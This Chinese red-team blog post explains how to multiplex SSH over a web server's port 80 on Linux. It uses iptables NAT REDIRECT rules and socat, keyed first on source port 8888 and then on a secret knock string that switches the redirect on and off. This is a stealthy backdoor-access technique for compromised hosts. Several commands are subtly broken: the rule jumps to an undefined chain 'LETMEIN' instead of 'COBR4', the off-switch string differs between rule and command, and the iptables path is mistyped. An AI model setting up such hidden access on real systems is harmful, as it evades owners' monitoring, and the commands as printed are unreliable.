---
layout:     post
title:    端口复用技术（下）-iptables
subtitle:   linux下的端口复用技术
date:       2019-11-07
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 红队
    - 渗透测试
    - 内网
---
# 端口复用技术（下）-iptables

## 简介
在linxu中进行端口复用没有像在windows中那样方便，需要通过iptables nat表中的PREROUTING 链配合REDIRECT进行端口流量转发来完成“端口复用”。  
比如在服务器的PREROUTING链里面加一条规则，将到本机80端口的流量REDIRECT到22端口，就算80端口此时正在被Apache监听，此流量也能成功到达22端口，因为nat表的PREROUTING链会在路由决策之前被处理。  
但是要达到上述的复用功能，必须解决一个问题，如何对发送到80端口的正常流量和“复用流量”进行区分？将http流量发到80，ssh流量发到22？  
这里的话是通过源端口来区分，比如来自外部3333端口的流量直接定向到本地22端口。  

## Demo
先来一个简单的demo。  
本机先开启一个apache服务。  
![191107_1](/img/191107_apacheweb.png)  
本机进行配置：  
```
# 将发送本机80端口，源端口为8888的流量重定向至本机 22 端口 
/s-bin/iptables -t nat -A PREROUTING -p tcp --sport 8888 --dport 80 -j REDIRECT --to-port 22
```
![191107_2](/img/191107_kaliiptables.png)  
然后在客户端连接时，用socat再进行一次本地转发：  
```
# socat 监听本地3333端口，接收到链接后，利用本地的8888端口将流量转至虚拟机的80端口 
socat tcp-listen:3333,fork,reuseaddr tcp:192.168.1.103:80,sourceport=8888,reuseaddr & 
# SSH 连接本地3333端口，成功连接上了虚拟机的SSH，同时本地正常用curl是能够访问到虚拟机的80端口的HTTP服务的 
ssh root@127.0.0.1 -p 3333
```  
然后可以连接。  
![191107_3](/img/191107_sshlocalhost.png)   
同时apache服务也是正常的。  
![191107_4](/img/191107_curl80.png)  
## 思考 
这里通过soruce port作为流量的标志，做到了80端口同时复用，互不影响，但是这里存在一个问题，由于你本地端口只能通过8888去连接ssh才能识别，这样就存在端口占用问题，也就无法支持多连接。  

## 改进
改进后，不再用source port做为“复用流量”的标识，所以也就不需要再用socat来进行一次本地的转发了。直接通过两条链规则去对端口流量进行区分，通过外部的tcp标志来判断使用哪套规则，说的很绕直接看demo。     
```
# 端口复用链
iptables -t nat -N COBR4
# 端口复用规则
iptables -t nat  -A COBR4 -p tcp -j REDIRECT --to-port 22

# 开启开关
iptables -A INPUT -p tcp -m string --string 'nmsl' --algo bm -m recent --set --name cobr4 --rsource -j ACCEPT
# 关闭开关
iptables -A INPUT -p tcp -m string --string 'nmhl' --algo bm -m recent --name cobr4 --remove -j ACCEPT
# let's do it
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name cobr4 --rsource -j LETMEIN
```  
这里通过tcp关键字对规则进行开关。  
首先先配置。  
![191107_5](/img/191107_kaliiptables2.png)  
开启：  
```
echo nmsl | socat - tcp:192.168.1.103:80
```
然后尝试通过80端口去ssh连接，可行。  
![191107_6](/img/191107_ssh80.png)  
但是此时发现，web服务已经无法使用。  
![191107_7](/img/191107_80error.png)   
关闭开关：
```
echo nhml | socat - tcp:192.168.1.103:80
```
即可恢复正常。  

## 总结
这里参考了n1nty老师傅很早前的文章，测试了下，能用得到。  
两种方式各有各的好处，也各有各的缺点，实际中还是要根据环境进行选择。  
关于iptables，的确是一个值得研究的东西。  

## 参考
[https://threathunter.org/topic/594545184ea5b2f5516e2033](https://threathunter.org/topic/594545184ea5b2f5516e2033)  
